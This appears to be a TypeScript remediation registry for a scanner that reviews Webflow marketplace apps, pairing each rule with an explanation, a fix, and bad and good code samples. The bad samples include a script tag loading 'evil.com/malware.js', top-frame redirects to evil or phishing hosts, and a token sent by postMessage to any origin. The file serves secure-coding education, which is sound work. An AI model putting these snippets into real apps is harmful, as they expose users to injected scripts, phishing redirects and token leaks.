/**
 * Remediation Registry
 * Educational content for each scan rule
 * Matches original IC implementation
 */

import type { RemediationInfo } from '../types';

export const REMEDIATION_REGISTRY: Record<string, RemediationInfo> = {
  'SEC-NO-DCE': {
    whyItMatters: 'Dynamic code execution (eval, new Function) allows arbitrary code injection, making your app vulnerable to XSS attacks and code tampering. Webflow\'s security model requires all code to be statically analyzable.',
    howToFix: 'Replace dynamic code execution with static alternatives. Use object lookups instead of eval for dynamic property access. For JSON parsing, use JSON.parse(). For dynamic imports, use proper ES modules.',
    badExample: `eval('user.' + propName);\nnew Function('return ' + expression)();\nsetTimeout('alert("hi")', 1000);`,
    goodExample: `user[propName];\nJSON.parse(jsonString);\nsetTimeout(() => alert("hi"), 1000);`,
    commonMistake: 'Using eval() for JSON parsing or dynamic property access when safer alternatives exist.',
    estimatedFixTime: '15-30 minutes',
    officialDocs: [
      { title: 'MDN: eval() Alternatives', url: 'https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/eval#never_use_eval!' },
      { title: 'Webflow Security Guidelines', url: 'https://developers.webflow.com/marketplace/guidelines' }
    ]
  },
  
  'SEC-NO-HOST-DOM': {
    whyItMatters: 'Accessing the parent frame\'s document breaks Webflow\'s sandbox isolation, potentially allowing your app to modify the Designer UI, steal credentials, or perform actions on behalf of the user.',
    howToFix: 'Remove all references to parent, top, or frameElement. Your app should operate entirely within its own sandbox. Use postMessage for controlled communication if needed.',
    badExample: `parent.document.body.style.display = 'none';\nwindow.top.location.href = 'https://evil.com';`,
    goodExample: `// Operate within your own document\ndocument.body.style.background = 'white';\n// Use postMessage for cross-frame communication\nwindow.parent.postMessage({ type: 'ready' }, 'https://webflow.com');`,
    estimatedFixTime: '30-60 minutes (may require architecture changes)',
    officialDocs: [
      { title: 'Webflow App Sandbox', url: 'https://developers.webflow.com/code-components/sandbox' },
      { title: 'MDN: Window.postMessage()', url: 'https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage' }
    ]
  },
  
  'NET-EXTERNAL-EGRESS': {
    whyItMatters: 'External API calls may transmit user data to third parties. While not always a problem, each external endpoint should be documented and justified.',
    howToFix: 'Document all external API calls in your app\'s privacy policy. Ensure you only send necessary data. Consider proxying through your own backend for sensitive operations.',
    commonMistake: 'Sending analytics or telemetry data without user consent.',
    estimatedFixTime: '5-10 minutes per endpoint (documentation)',
    officialDocs: [
      { title: 'Webflow Data Privacy Requirements', url: 'https://developers.webflow.com/marketplace/guidelines#data-privacy' }
    ]
  },
  
  'SEC-NO-CLIENT-SECRETS': {
    whyItMatters: 'API keys and secrets in client-side code can be extracted by anyone viewing your bundle. This can lead to unauthorized API usage, billing charges, or data breaches.',
    howToFix: 'Never include secrets in client-side code. Use environment variables on your backend. For Webflow apps, use the server-side authentication flow and store tokens securely on your server.',
    badExample: `const API_KEY = 'sk_live_123abc';\nconst AWS_KEY = 'AKIAIOSFODNN7EXAMPLE';`,
    goodExample: `// Fetch from your secure backend\nconst response = await fetch('/api/proxy', {\n  headers: { 'Authorization': 'Bearer ' + sessionToken }\n});`,
    estimatedFixTime: '1-4 hours (requires backend changes)',
    officialDocs: [
      { title: 'OWASP: Secrets Management', url: 'https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html' },
      { title: 'Webflow OAuth Guide', url: 'https://developers.webflow.com/oauth' }
    ]
  },
  
  'SEC-CODE-TRANSPARENCY': {
    whyItMatters: 'Obfuscated code cannot be reviewed for security issues. It may hide malicious functionality. Webflow requires all code to be human-readable for the review process.',
    howToFix: 'Submit your original, unobfuscated source code. Minification is acceptable, but tools like javascript-obfuscator are not. If using a build process, include source maps.',
    badExample: `eval(function(p,a,c,k,e,d){...});\nvar _0x1a2b = ['\\x68\\x65\\x6c\\x6c\\x6f'];`,
    goodExample: `// Minified but readable\nfunction greet(n){return"Hello, "+n}\n// Or original source\nfunction greet(name) {\n  return "Hello, " + name;\n}`,
    estimatedFixTime: 'Requires rebuilding without obfuscation',
    officialDocs: [
      { title: 'Webflow Code Review Requirements', url: 'https://developers.webflow.com/marketplace/guidelines#code-review' }
    ]
  },
  
  'PROD-NO-LOCALHOST': {
    whyItMatters: 'Localhost URLs won\'t work in production and indicate incomplete development. They may also expose internal infrastructure details.',
    howToFix: 'Replace all localhost/development URLs with production endpoints. Use environment-based configuration to switch between dev and prod URLs.',
    badExample: `const API_URL = 'http://localhost:3000/api';\nfetch('http://127.0.0.1:8080/data');`,
    goodExample: `const API_URL = process.env.API_URL || 'https://api.myapp.com';\nfetch(API_URL + '/data');`,
    estimatedFixTime: '10-30 minutes',
    officialDocs: [
      { title: 'Environment Configuration Best Practices', url: 'https://12factor.net/config' }
    ]
  },
  
  'SEC-NO-SENSITIVE-TOKENS-IN-STORAGE': {
    whyItMatters: 'LocalStorage is accessible to any JavaScript running on the same origin, making it vulnerable to XSS attacks. Sensitive tokens should use httpOnly cookies or memory-only storage.',
    howToFix: 'Use httpOnly, secure cookies for authentication tokens. For temporary storage, use sessionStorage or keep tokens in memory only. Never persist refresh tokens client-side.',
    badExample: `localStorage.setItem('auth_token', jwt);\nlocalStorage.setItem('refresh_token', refreshToken);`,
    goodExample: `// Store in memory only\nlet authToken = null;\nfunction setToken(token) { authToken = token; }\n// Or use httpOnly cookies set by your backend`,
    estimatedFixTime: '1-2 hours',
    officialDocs: [
      { title: 'OWASP: Session Management', url: 'https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html' },
      { title: 'MDN: Using HTTP Cookies', url: 'https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies' }
    ]
  },
  
  'NET-URL-HYGIENE': {
    whyItMatters: 'HTTP connections can be intercepted and modified by attackers (MITM). All network requests should use HTTPS to ensure data integrity and confidentiality.',
    howToFix: 'Replace all http:// URLs with https://. Ensure your backend supports HTTPS. Remove any javascript: protocol usage.',
    badExample: `fetch('http://api.example.com/data');\n<a href="javascript:void(0)">`,
    goodExample: `fetch('https://api.example.com/data');\n<button onClick={handleClick}>`,
    estimatedFixTime: '10-30 minutes',
    officialDocs: [
      { title: 'MDN: HTTPS', url: 'https://developer.mozilla.org/en-US/docs/Glossary/HTTPS' }
    ]
  },
  
  'SEC-UNSAFE-HTML': {
    whyItMatters: 'Direct HTML injection bypasses React\'s XSS protections. User-supplied content rendered via innerHTML can execute malicious scripts.',
    howToFix: 'Use React\'s JSX for all rendering. If you must render HTML, sanitize it with DOMPurify first. Never use document.write().',
    badExample: `element.innerHTML = userInput;\ndocument.write('<script>alert(1)</script>');`,
    goodExample: `// Use React JSX\nreturn <div>{userInput}</div>;\n// Or sanitize with DOMPurify\nimport DOMPurify from 'dompurify';\nelement.innerHTML = DOMPurify.sanitize(userInput);`,
    estimatedFixTime: '30-60 minutes',
    officialDocs: [
      { title: 'React: dangerouslySetInnerHTML', url: 'https://react.dev/reference/react-dom/components/common#dangerously-setting-the-inner-html' },
      { title: 'DOMPurify', url: 'https://github.com/cure53/DOMPurify' }
    ]
  },
  
  'SEC-SCRIPT-INJECTION': {
    whyItMatters: 'Dynamic script injection can load malicious code from external sources, bypassing CSP and allowing complete compromise of the application.',
    howToFix: 'Bundle all JavaScript with your app. Don\'t load scripts dynamically from external URLs. If you need to load external resources, use approved CDNs and add integrity hashes.',
    badExample: `const script = document.createElement('script');\nscript.src = 'https://evil.com/malware.js';\ndocument.body.appendChild(script);`,
    goodExample: `// Bundle dependencies at build time\nimport { library } from 'approved-package';\n// Or use integrity hashes\n<script src="https://cdn.example.com/lib.js" integrity="sha384-..." crossorigin="anonymous">`,
    estimatedFixTime: '1-2 hours (may require build changes)',
    officialDocs: [
      { title: 'MDN: Subresource Integrity', url: 'https://developer.mozilla.org/en-US/docs/Web/Security/Subresource_Integrity' }
    ]
  },
  
  'IFRAME-EXTERNAL-SRC': {
    whyItMatters: 'External iframes can display phishing content, track users, or attempt to escape the sandbox through clickjacking.',
    howToFix: 'Remove external iframes unless they\'re for authentication flows with approved providers. Use sandbox attributes on any remaining iframes.',
    badExample: `<iframe src="https://unknown-site.com/widget"></iframe>`,
    goodExample: `// For auth flows only\n<iframe \n  src="https://accounts.google.com/o/oauth2/..." \n  sandbox="allow-scripts allow-forms allow-same-origin"\n></iframe>`,
    estimatedFixTime: '30-60 minutes',
    officialDocs: [
      { title: 'MDN: iframe sandbox', url: 'https://developer.mozilla.org/en-US/docs/Web/HTML/Element/iframe#sandbox' }
    ]
  },
  
  'IFRAME-SANDBOX': {
    whyItMatters: 'The allow-top-navigation sandbox permission lets iframes navigate the parent frame, enabling clickjacking or redirect attacks.',
    howToFix: 'Remove allow-top-navigation from sandbox attributes. If navigation is required, use postMessage to request navigation from the parent.',
    badExample: `<iframe sandbox="allow-scripts allow-top-navigation">`,
    goodExample: `<iframe sandbox="allow-scripts allow-forms allow-same-origin">`,
    estimatedFixTime: '15-30 minutes',
    officialDocs: [
      { title: 'MDN: iframe sandbox', url: 'https://developer.mozilla.org/en-US/docs/Web/HTML/Element/iframe#sandbox' }
    ]
  },
  
  'IFRAME-MESSAGING': {
    whyItMatters: 'Using "*" as the targetOrigin in postMessage sends data to any recipient, potentially leaking sensitive information to malicious sites.',
    howToFix: 'Always specify the exact target origin. Validate the origin of incoming messages.',
    badExample: `parent.postMessage({ token: jwt }, '*');`,
    goodExample: `parent.postMessage({ type: 'ready' }, 'https://webflow.com');\n// Validate incoming messages\nwindow.addEventListener('message', (e) => {\n  if (e.origin !== 'https://webflow.com') return;\n  // Handle message\n});`,
    estimatedFixTime: '15-30 minutes',
    officialDocs: [
      { title: 'MDN: Window.postMessage() Security', url: 'https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage#security_concerns' }
    ]
  },
  
  'SEC-WEBRTC-HARDWARE': {
    whyItMatters: 'Accessing camera, microphone, or screen capture in a design tool is unexpected and could be used to spy on users.',
    howToFix: 'Remove all hardware access code. If your app genuinely needs media access, it should operate outside the Designer context.',
    badExample: `navigator.mediaDevices.getUserMedia({ video: true, audio: true });`,
    goodExample: `// Hardware access is not permitted in Webflow apps\n// Provide media functionality through your own hosted interface`,
    estimatedFixTime: 'May require significant redesign',
    officialDocs: [
      { title: 'Webflow App Permissions', url: 'https://developers.webflow.com/marketplace/guidelines#permissions' }
    ]
  },
  
  'PRIV-NO-FINGERPRINTING': {
    whyItMatters: 'Fingerprinting and session replay capture detailed user behavior without consent, violating privacy regulations like GDPR.',
    howToFix: 'Remove all fingerprinting libraries (rrweb, FullStory, LogRocket, etc.). If analytics are needed, use privacy-respecting alternatives with proper consent.',
    badExample: `import rrweb from 'rrweb';\nrrweb.record({ emit: sendToServer });`,
    goodExample: `// Use privacy-respecting analytics\n// Obtain explicit user consent\n// Aggregate data server-side`,
    estimatedFixTime: '30-60 minutes',
    officialDocs: [
      { title: 'GDPR Compliance', url: 'https://gdpr.eu/what-is-gdpr/' }
    ]
  },
  
  'UX-NO-SILENT-MUTATIONS': {
    whyItMatters: 'Automatic modifications to the canvas without user action are confusing and may lead to unexpected changes in user projects.',
    howToFix: 'Ensure all modifications are triggered by explicit user actions. Show clear feedback when changes are made.',
    commonMistake: 'Using MutationObserver to automatically "fix" content without user knowledge.',
    estimatedFixTime: '15-30 minutes',
    officialDocs: [
      { title: 'Webflow UX Guidelines', url: 'https://developers.webflow.com/marketplace/guidelines#user-experience' }
    ]
  },
  
  'SEC-UNTRUSTED-REDIRECT': {
    whyItMatters: 'Navigating the top frame can redirect users away from Webflow to phishing sites or malicious content.',
    howToFix: 'Remove all top/parent location assignments. Open external links in new tabs if needed, with user consent.',
    badExample: `top.location.href = 'https://phishing-site.com';`,
    goodExample: `// Open in new tab with user action\n<a href="https://docs.example.com" target="_blank" rel="noopener">View Docs</a>`,
    estimatedFixTime: '15-30 minutes',
    officialDocs: [
      { title: 'OWASP: Unvalidated Redirects', url: 'https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html' }
    ]
  },
  
  'UX-NO-POPUPS': {
    whyItMatters: 'Unexpected popups are disruptive and may be used for advertising or phishing. All UI should be contained within the app panel.',
    howToFix: 'Use in-panel modals instead of window.open(). If external links are necessary, use regular anchor tags with target="_blank".',
    badExample: `window.open('https://example.com', 'popup', 'width=400,height=300');`,
    goodExample: `// Use an in-panel modal\nsetShowModal(true);\n// Or a regular link for external content\n<a href="https://docs.example.com" target="_blank" rel="noopener">Documentation</a>`,
    estimatedFixTime: '30-60 minutes',
    officialDocs: [
      { title: 'Webflow UX Guidelines', url: 'https://developers.webflow.com/marketplace/guidelines#user-experience' }
    ]
  }
};

export default REMEDIATION_REGISTRY;
